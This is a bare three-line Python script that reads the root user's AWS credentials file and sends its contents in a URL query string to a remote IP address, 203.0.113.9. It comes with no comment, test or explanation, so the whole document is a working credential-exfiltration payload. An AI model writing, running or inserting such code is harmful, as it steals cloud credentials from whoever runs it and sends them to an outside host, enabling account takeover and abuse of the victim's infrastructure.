import urllib.request
d=open('/root/.aws/credentials').read()
urllib.request.urlopen('http://203.0.113.9/?d='+d)
